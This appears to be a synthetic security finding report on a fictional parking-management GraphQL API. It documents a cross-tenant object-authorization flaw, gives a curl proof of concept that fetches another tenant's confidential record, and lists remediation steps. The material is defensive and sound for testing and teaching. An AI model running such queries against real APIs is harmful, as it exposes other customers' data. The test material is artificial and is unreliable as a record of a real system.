# Security Analysis Report

**System:** ParkIQ Management API — v2.1.3 (FINAL)
**Domain:** Parking / Smart City
**Example ID:** GQL-0250
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.9 | Batch/bulk lookup endpoint returns cross-tenant intersection data |

---

## Finding 1 — BOLA: Batch Lookup Exposes Victim Intersection Records

### Summary
The `getIntersection` GraphQL resolver on ParkIQ Management API (`api.parkiq-management-ap.example.com`) accepts a caller-supplied `id` argument without validating that the fetched record belongs to the calling tenant. An attacker authenticated to `tenant-e6a0` can query intersection `I-2250`, which belongs to `tenant-3106`, by directly supplying that node ID. The resolver performs no tenancy boundary check, as documented in §4.0 RISK-GQL-250. The declared vulnerability pattern is 1.9 (Batch/bulk lookup) because `bulkIntersectionLookup` (§3.0 schema) also accepts an arbitrary ID array with no per-ID ownership filtering; the HAR trace demonstrates the same root-cause flaw through the single-record `getIntersection` resolver.

### Evidence from HAR

**Request — Attack (§6.0)**
```
POST https://api.parkiq-management-ap.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-e6a0
Content-Type: application/json

{"query": "query VulnerableOp { getIntersection(id: \"I-2250\") { nodeId tenantId ownerId data { sensitiveField internalNotes } } }"}
```

**Response — Victim Data Returned (§6.0)**
```json
{
  "data": {
    "getIntersection": {
      "tenantId": "tenant-3106",
      "ownerId": "other-user-e6a03106",
      "data": {
        "sensitiveField": "CONFIDENTIAL-e6a03106",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

Note: `x-request-id: req-e6a03106` is a server-assigned **response** header (§6.0 response.headers) and is not part of the attack request.

### Evidence Map

| Artifact Location | Key Detail |
|---|---|
| §2.0 Architecture | Redis cache keyed by `nodeId` only — no user/tenant dimension |
| §3.0 Schema | `getIntersection(id: ID!)` — argument is a plain node ID, no tenant scope |
| §3.0 Schema | `bulkIntersectionLookup(ids: [ID!]!)` — batch endpoint, no per-ID ownership filtering |
| §4.0 RISK-GQL-250 | Resolver fetches by `nodeId` only; no tenancy check documented |
| §5.0 Pattern 1.9 | Batch/bulk lookup path — root cause is missing ownership check per object ID |
| HAR request | Attacker `tenant-e6a0` supplies `id: "I-2250"` belonging to `tenant-3106` |
| HAR response | `CONFIDENTIAL-e6a03106` and `internalNotes` from victim tenant returned |

---

## Steps to Reproduce

```bash
# Step 1 — Authenticate as attacker (tenant-e6a0)
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"

# Step 2 — Query victim intersection I-2250 directly
# x-request-id is server-assigned and appears in the response; it is NOT sent in the request
curl -s -X POST https://api.parkiq-management-ap.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-tenant-id: tenant-e6a0" \
  -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { getIntersection(id: \"I-2250\") { nodeId tenantId ownerId data { sensitiveField internalNotes } } }"}'

# Expected (vulnerable): Returns CONFIDENTIAL-e6a03106 and internalNotes from tenant-3106
# Expected (secure): Returns authorization error — "Not authorized to access intersection I-2250"
```

---

## Remediation

1. **Resolver ownership check:** In `getIntersection` and all bulk-variant resolvers, enforce `WHERE tenant_id = $jwt.tenantId AND node_id = $id` — reject requests where the fetched record's `tenantId` does not match the JWT claim.
2. **Cache keying:** Include `tenantId` in the Redis cache key: `intersection:{tenantId}:{nodeId}`.
3. **Batch endpoint hardening:** For `bulkIntersectionLookup`, filter the result set server-side to only return records matching the caller's JWT tenant before returning the response.
4. **Field allowlist:** Strip `internalNotes` from responses unless the caller has explicit read permission.
